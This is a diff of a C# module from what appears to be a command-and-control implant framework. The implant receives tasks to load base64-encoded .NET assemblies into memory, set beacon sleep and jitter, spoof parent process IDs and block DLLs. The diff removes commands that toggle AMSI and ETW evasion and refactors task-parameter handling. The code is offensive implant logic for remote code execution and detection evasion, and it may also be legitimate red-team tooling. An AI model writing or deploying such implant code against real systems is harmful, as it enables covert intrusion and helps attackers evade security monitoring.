@@ -7,7 +7,6 @@ using Shared.Models;
 using System;
 using System.Collections.Generic;
 using System.Diagnostics;
-using System.Linq;
 using System.Reflection;
 
 namespace Agent.Modules
@@ -52,16 +51,6 @@ namespace Agent.Modules
                     },
                     new ModuleInfo.Command
                     {
-                        Name = "DisableAMSI",
-                        Delegate = SetDisableAMSI
-                    },
-                    new ModuleInfo.Command
-                    {
-                        Name = "DisableETW",
-                        Delegate = SetDisableETW
-                    },
-                    new ModuleInfo.Command
-                    {
                         Name = "Exit",
                         Delegate = ExitAgent
                     }
@@ -69,17 +58,16 @@ namespace Agent.Modules
             };
         }
 
-        void LoadAgentModule(string AgentID, C2Data C2Data)
+        void LoadAgentModule(string AgentID, AgentTask Task)
         {
             try
             {
-                var parameters = Shared.Utilities.Utilities.DeserialiseData<TaskParameters>(C2Data.Data).Parameters;
-                var asmBytes = Convert.FromBase64String((string)parameters.FirstOrDefault(p => p.Name.Equals("Assembly", StringComparison.OrdinalIgnoreCase)).Value);
+                var bytes = Convert.FromBase64String((string)Task.Parameters["Assembly"]);
 
                 var currentDomain = AppDomain.CurrentDomain;
                 currentDomain.AssemblyResolve += new ResolveEventHandler(MyResolveEventHandler);
 
-                var asm = currentDomain.Load(asmBytes);
+                var asm = currentDomain.Load(bytes);
                 var instance = asm.CreateInstance("Agent.Module", true);
 
                 if (instance is IAgentModule)
@@ -101,20 +89,17 @@ namespace Agent.Modules
             }
         }
 
-        void SetSleep(string AgentID, C2Data C2Data)
+        void SetSleep(string AgentID, AgentTask Task)
         {
             try
             {
-                var parameters = Shared.Utilities.Utilities.DeserialiseData<TaskParameters>(C2Data.Data).Parameters;
-
-                var interval = parameters.FirstOrDefault(p => p.Name.Equals("Interval", StringComparison.OrdinalIgnoreCase)).Value;
+                var interval = Task.Parameters["Interval"];
+                var jitter = Task.Parameters["Jitter"];
 
                 if (interval != null)
                 {
                     Config.Set(AgentConfig.SleepInterval, (int)interval);
                 }
-
-                var jitter = parameters.FirstOrDefault(p => p.Name.Equals("Jitter", StringComparison.OrdinalIgnoreCase)).Value;
 
                 if (jitter != null)
                 {
@@ -127,12 +112,11 @@ namespace Agent.Modules
             }
         }
 
-        void SetPPID(string AgentID, C2Data C2Data)
+        void SetPPID(string AgentID, AgentTask Task)
         {
             try
             {
-                var parameters = Shared.Utilities.Utilities.DeserialiseData<TaskParameters>(C2Data.Data).Parameters;
-                var ppid = parameters.FirstOrDefault(p => p.Name.Equals("PPID", StringComparison.OrdinalIgnoreCase)).Value;
+                var ppid = Task.Parameters["PPID"];
 
                 Process process;
 
@@ -155,12 +139,11 @@ namespace Agent.Modules
             }
         }
 
-        void SetBlockDLLs(string AgentID, C2Data C2Data)
+        void SetBlockDLLs(string AgentID, AgentTask Task)
         {
             try
             {
-                var parameters = Shared.Utilities.Utilities.DeserialiseData<TaskParameters>(C2Data.Data).Parameters;
-                var block = parameters.FirstOrDefault(p => p.Name.Equals("BlockDLLs", StringComparison.OrdinalIgnoreCase)).Value;
+                var block = Task.Parameters["BlockDLLs"];
 
                 bool current;
 
@@ -197,91 +180,7 @@ namespace Agent.Modules
             }
         }
 
-        void SetDisableAMSI(string AgentID, C2Data C2Data)
-        {
-            try
-            {
-                var parameters = Shared.Utilities.Utilities.DeserialiseData<TaskParameters>(C2Data.Data).Parameters;
-                var disable = parameters.FirstOrDefault(p => p.Name.Equals("DisableAMSI", StringComparison.OrdinalIgnoreCase)).Value;
-
-                bool current;
-
-                if (disable == null)
-                {
-                    current = Config.Get<bool>(AgentConfig.DisableAMSI);
-                }
-                else
-                {
-                    if ((bool)disable)
-                    {
-                        Config.Set(AgentConfig.DisableAMSI, true);
-                    }
-                    else
-                    {
-                        Config.Set(AgentConfig.DisableAMSI, false);
-                    }
-
-                    current = Config.Get<bool>(AgentConfig.DisableAMSI);
-                }
-
-                if (current)
-                {
-                    Agent.SendMessage($"DisableAMSI is enabled.");
-                }
-                else
-                {
-                    Agent.SendMessage($"DisableAMSI is disabled.");
-                }
-            }
-            catch (Exception e)
-            {
-                Agent.SendError(e.Message);
-            }
-        }
-
-        void SetDisableETW(string AgentID, C2Data C2Data)
-        {
-            try
-            {
-                var parameters = Shared.Utilities.Utilities.DeserialiseData<TaskParameters>(C2Data.Data).Parameters;
-                var disable = parameters.FirstOrDefault(p => p.Name.Equals("DisableETW", StringComparison.OrdinalIgnoreCase)).Value;
-
-                bool current;
-
-                if (disable == null)
-                {
-                    current = Config.Get<bool>(AgentConfig.DisableETW);
-                }
-                else
-                {
-                    if ((bool)disable)
-                    {
-                        Config.Set(AgentConfig.DisableETW, true);
-                    }
-                    else
-                    {
-                        Config.Set(AgentConfig.DisableETW, false);
-                    }
-
-                    current = Config.Get<bool>(AgentConfig.DisableETW);
-                }
-
-                if (current)
-                {
-                    Agent.SendMessage($"DisableETW is enabled.");
-                }
-                else
-                {
-                    Agent.SendMessage($"DisableETW is disabled.");
-                }
-            }
-            catch (Exception e)
-            {
-                Agent.SendError(e.Message);
-            }
-        }
-
-        void ExitAgent(string AgentID, C2Data C2Data)
+        void ExitAgent(string AgentID, AgentTask Task)
         {
             Agent.Stop();
         }
